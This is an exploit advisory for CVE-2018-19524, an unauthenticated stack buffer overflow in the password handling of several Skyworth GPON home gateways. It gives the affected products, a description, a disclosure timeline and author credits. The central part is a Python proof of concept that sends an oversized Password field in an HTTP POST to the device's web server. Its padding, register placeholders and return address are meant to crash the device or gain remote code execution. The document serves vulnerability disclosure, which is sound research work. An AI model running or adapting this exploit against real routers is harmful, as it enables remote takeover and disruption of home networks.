'''
========================================================
Unauthenticated  Stack Overflow in Multiple Gpon Devices
========================================================

. contents:: Table Of Content

Overview
========

Title:- StackOverflow in Multiple Skyworth GPON HomeGateways and Optical Network terminals.
CVE-ID :- CVE-2018-19524
Author: Kaustubh G. Padwad
Vendor: Shenzhen Skyworth Digital Technology Company Ltd.(http://www.skyworthdigital.com/products)
Products:
   1.DT741 Converged Intelligent Terminal (G/EPON+IPTV)
  2.DT741 Converged Intelligent Terminal (G/EPON+IPTV)
  3.DT721-cb GPON uplink home gateway (GPON+2FE+1POTS)
  4.DT721-cb GPON Uplink Home Gateway (GPON+2FE+1POTS)
  5.DT741-cb GPON uplink home gateway (GPON+4FE+1POTS+WIFI+USB)
  6.DT741-cb GPON Uplink Home Gateway (GPON+4FE+1POTS+WIFI+USB)
  7.DT741-cbGPON uplink home gateway DT741-cb


Tested Version: : Multiple versions
Severity: High--Critical

Advisory ID
============
KSA-Dev-001

About the Product:
==================

* The (products from above list)  is a high performance GPON access gateway that complies with ITU-G.984 and CTC standards.
* Configure a GPON optical interface, two FEs, one POTS
* Provide Ethernet, VOIP and other interfaces to meet the access requirements of different devices.
* It can provide high-performance broadband access services for home users, individual users, and SOHO small businesses.
* Supports the standard TR069 protocol,which can be flexibly customized according to the carrier network and is compatible with mainstream OLT,software switching and service management platforms

Description:
============
An issue was discovered on Shenzhen Skyworth
DT741 Converged Intelligent Terminal (G/EPON+IPTV) SDOTBGN1,DT721-cb SDOTBGN1,and DT741-cb SDOTBGN1 devices.
A long password to the Web_passwd function allows remote attackers to cause a denial of service (segmentation fault) or
achieve unauthenticated remote code execution because of control of registers
S0 through S4 and T4 through T7.


Additional Information
========================
The value of password under Web_passwd function is not getting sanitized,so passing too much junk data to the password parameter triggers to the SIGSEGV segmentation fault in device, post research it
was possible to control the registers from S0-S4 and T4-T7.A Successful exploitation could leads to unauthenticated remote code execution on device.


[Affected Component]
web_passwd function inside the boa web server implementation.

------------------------------------------
[Attack Type]
Remote
------------------------------------------
[Impact Code execution]
true
------------------------------------------
[Impact Denial of Service]
true

------------------------------------------
[Attack Vectors]
Remote code execution by running the poc.py against the target ip address.

[Vulnerability Type]
====================
Buffer Overflow,Exec

How to Reproduce: (POC):
========================

One can use below exploit
'''

import socket
import struct

buf = "POST /cgi-bin/index2.asp  HTTP/1.1\r\nHOST: 192.168.1.1\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://192.168.1.2/cgi-bin/index2.asp\r\nCookie: LoginTimes=0\r\nConnection: Close\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1714\r\n\n"
buf+="Username=Bufferoverflow"
buf+="&Logoff=0"
buf+="&LoginTimes=1"
buf+="&LoginTimes_Zero=0"
buf+="&value_one=1"
buf+="&Password1=xss"
buf+="&Password2=xss"
buf+="&logintype=usr"
buf+="&Password="
buf+="A"*999 #Padding till T4
buf+="T4T4" #T4 Address 0x2BB30D5C kill address based on libc
buf+="T7T7" #T7 sleep address based on libc
buf+="B"*9 #Padding till T6
buf+= "T6T6" #T7 Address Sleep Address Based on libc negetive
buf+="K"*8 #Padding between T6to s0
buf+="S0S0" #S0 Address sleep address boa possitive
buf+="S1S1" #S1 Address Sleep Address Boa negetive
buf+="S2S2" #S2 Address Normal Sleep Adress
buf+="S3S3" #S3Address System Address
buf+="\xA0\x0E\xA2\x18" #return Address
buf+="K"*600


print buf
print "[+] sending buffer size", len(buf)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.1", 80))
s.send(buf)

'''
Mitigation
==========

No Official mitigation recived from vendor.

[Vendor of Product]
Shenzhen Skyworth Digital Technology Company Ltd.(http://www.skyworthdigital.com/products)

Disclosure:
===========
01-Nov-2018 Discoverd the vulnerability
03-Nov-2018 Reported to vendor (No Response)
13-Nov-2018 follow-up-01 (No reposonse.)
24-Nov-2018 Requested for CVE/Cve's.
26-Nov-2018 CVE-Assign by Mitre

credits:
========
* Kaustubh Padwad
* Information Security Researcher
* kingkaustubh@me.com
* https://s3curityb3ast.github.io/
* https://twitter.com/s3curityb3ast
* http://breakthesec.com
* https://www.linkedin.com/in/kaustubhpadwad
'''